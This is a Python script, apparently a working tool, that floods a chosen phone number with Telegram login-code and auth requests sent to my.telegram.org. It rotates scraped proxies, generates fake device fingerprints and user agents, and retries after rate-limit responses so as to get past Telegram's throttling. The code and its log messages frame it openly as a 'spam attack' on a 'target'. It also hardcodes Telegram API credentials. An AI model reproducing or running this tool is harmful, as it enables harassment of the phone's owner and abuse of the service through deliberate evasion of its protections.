from rich.console import Console
from rich.logging import RichHandler
from rich.progress import Progress
import logging
import requests
import random
import string
import time
from itertools import cycle
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent
import os
import subprocess

# Telegram API credentials (замени своими)
API_ID = "21396552"
API_HASH = "511063b3c4ef25705b8fe826234e53e6"

# Set up rich console and logger
console = Console()
logging.basicConfig(
    level="INFO",
    format="%(message)s",
    datefmt="[%X]",
    handlers=[RichHandler(console=console)]
)
logger = logging.getLogger("evil_spammer")

    
# Проверка прокси на работоспособность
def validate_proxy(proxy, timeout=5):
    test_url = "https://my.telegram.org/auth/send_password"  # замени на настоящий
    headers = {"User-Agent": UserAgent().random}
    proxies = None if proxy == "local" else {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    }
    try:
        response = requests.post(test_url, headers=headers, data={"phone_number": "+1234567890", "api_id": API_ID, "api_hash": API_HASH}, proxies=proxies, timeout=timeout)
        if response.status_code in [200, 429]:
            logger.info(f"[bold green]✅ Proxy {proxy} is alive for Telegram! ✅[/bold green]")
            return True
        return False
    except Exception as e:
        logger.warning(f"[bold yellow]⚠️ Proxy {proxy} failed for {test_url}: {str(e)}! ⚠️[/bold yellow]")
        return False


# Загрузка и проверка прокси из файла
def load_proxies():
    try:
        with open("proxy.txt", "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        if not proxies:
            logger.error("[bold red]💥 proxy.txt is empty! 😈[/bold red]")
            return []

        valid_proxies = []
        with ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(validate_proxy, proxies)
            valid_proxies = [proxy for proxy, valid in zip(proxies, results) if valid]

        if valid_proxies:
            try:
                with open("proxy.txt", "w") as f:
                    for proxy in valid_proxies:
                        f.write(f"{proxy}\n")
                    f.flush()
                logger.info(f"[bold green]😈 Updated proxy.txt with {len(valid_proxies)} valid proxies! 😈[/bold green]")
            except Exception as e:
                logger.error(f"[bold red]💥 Failed to update proxy.txt: {e}! 💥[/bold red]")

        if not valid_proxies:
            logger.error("[bold red]💥 No valid proxies in proxy.txt! 😈[/bold red]")
            return []
        logger.info(f"[bold green]🔥 Loaded {len(valid_proxies)} valid proxies from proxy.txt! 🔥[/bold green]")
        return valid_proxies
    except FileNotFoundError:
        logger.error("[bold red]💥 proxy.txt not found! 😈[/bold red]")
        try:
            open("proxy.txt", "a").close()
            logger.info("[bold yellow]🕵️‍♂️ Created empty proxy.txt! 😈[/bold yellow]")
        except Exception as e:
            logger.error(f"[bold red]💥 Failed to create proxy.txt: {e}! 💥[/bold red]")
        return []


# Генерация случайного устройства
def generate_device():
    ua = UserAgent()
    device = {
        "user_agent": ua.random,
        "device_id": ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
        "platform": random.choice(["Android", "iOS", "Windows", "Linux"]),
        "app_version": f"{random.randint(1, 9)}.{random.randint(0, 9)}.{random.randint(0, 9)}",
        "session_id": ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    }
    return device


# Отправка запроса
def send_request(phone_number, proxy, device, url, proxy_pool, max_retries=3):
    headers = {
        "User-Agent": device["user_agent"],
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Session-ID": device["session_id"],
        "X-Client-Version": f"{random.randint(1, 5)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
    }
    data = {"phone_number": phone_number, "api_id": API_ID, "api_hash": API_HASH} if "send_code" in url else {"phone": phone_number}
    current_proxy = proxy
    proxies = None if current_proxy == "local" else {
        "http": f"http://{current_proxy}",
        "https": f"http://{current_proxy}"
    }

    for attempt in range(max_retries):
        try:
            response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=5)
            logger.info(
                f"[bold green]😈 Sent request for {phone_number} via {current_proxy} "
                f"({device['platform']}, {device['app_version']}) to {url} - Status: {response.status_code} 😈[/bold green]"
            )
            if response.status_code == 429:
                retry_after = int(response.headers.get('Retry-After', random.uniform(5, 10)))
                logger.warning(f"[bold yellow]⚠️ Rate limit hit for {phone_number} via {current_proxy} on {url}! Retrying after {retry_after} seconds... ⚠️[/bold yellow]")
                time.sleep(retry_after)
                current_proxy = next(proxy_pool)
                proxies = None if current_proxy == "local" else {
                    "http": f"http://{current_proxy}",
                    "https": f"http://{current_proxy}"
                }
                continue
            return True
        except Exception as e:
            logger.error(
                f"[bold red]💥 Attempt {attempt + 1}/{max_retries} failed for {phone_number} via {current_proxy} "
                f"({device['platform']}, {device['app_version']}) to {url} - Error: {str(e)} 💥[/bold red]"
            )
            if attempt < max_retries - 1:
                current_proxy = next(proxy_pool)
                proxies = None if current_proxy == "local" else {
                    "http": f"http://{current_proxy}",
                    "https": f"http://{current_proxy}"
                }
                time.sleep(random.uniform(1, 5))
    return False


# Главная функция
def main():
    console.print("[bold magenta]😈 Welcome to the Ultimate Telegram Code Spam-o-Tron! 😈[/bold magenta]")

    run_proxy_hunter = console.input(
        "[bold yellow]🕵️‍♂️ Run proxy hunter to scrape fresh proxies? (y/n): [/bold yellow]"
    ).lower() == 'y'

    proxies = []
    if run_proxy_hunter:
        console.print("[bold magenta]😈 Launching proxy hunter... 😈[/bold magenta]")
        try:
            subprocess.run(["python3", "proxy_hunter.py"], check=True)
            proxies = load_proxies()
        except Exception as e:
            console.print(f"[bold red]💥 Failed to run proxy hunter: {e}! 😈[/bold red]")
            proxies = load_proxies()
    else:
        proxies = load_proxies()

    if not proxies:
        manual_proxies = console.input(
            "[bold yellow]🕵️‍♂️ No proxies found! Enter proxies (comma-separated, e.g., 1.2.3.4:8080) or leave blank for local IP: [/bold yellow]"
        ).strip()
        if manual_proxies:
            proxies = [p.strip() for p in manual_proxies.split(",")]
            try:
                with open("proxy.txt", "w") as f:
                    for proxy in proxies:
                        f.write(f"{proxy}\n")
                    f.flush()
                logger.info(f"[bold green]😈 Saved {len(proxies)} manual proxies to proxy.txt! 😈[/bold green]")
            except Exception as e:
                logger.error(f"[bold red]💥 Failed to save proxy.txt: {e}! 💥[/bold red]")
        else:
            proxies = ["local"]
            console.print("[bold yellow]⚠️ Using local IP for attack! Proceed with caution! ⚠️[/bold yellow]")

    phone_number = console.input("[bold yellow]📱 Enter the target phone number (e.g., +1234567890): [/bold yellow]")
    num_requests = int(console.input("[bold yellow]💣 How many requests to unleash? (Enter a number): [/bold yellow]"))

    endpoints = [
        "https://my.telegram.org/auth/send_password",
        "https://my.telegram.org/auth"
    ]

    proxy_pool = cycle(proxies)
    success_count = 0
    total_tasks = num_requests * len(endpoints)

    logger.info("[bold magenta]🎭 Unleashing chaos with loaded proxies and fake devices! 🎭[/bold magenta]")

    with Progress(console=console) as progress:
        task_send_code = progress.add_task("[red]💣 Spamming send_code...", total=num_requests)
        task_auth = progress.add_task("[red]💣 Spamming auth...", total=num_requests)
        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = []
            for _ in range(num_requests):
                proxy = next(proxy_pool)
                device = generate_device()
                for i, url in enumerate(endpoints):
                    futures.append(executor.submit(send_request, phone_number, proxy, device, url, proxy_pool))
                    progress.advance(task_send_code if i == 0 else task_auth)
                time.sleep(random.uniform(1, 5))  # Задержка для обхода rate limit

            for future in futures:
                if future.result():
                    success_count += 1

    console.print(
        f"[bold green]😈 Spam attack completed! {success_count}/{total_tasks} requests "
        f"hit the target! Telegram is quivering! 😈[/bold green]"
    )


if __name__ == "__main__":
    main()

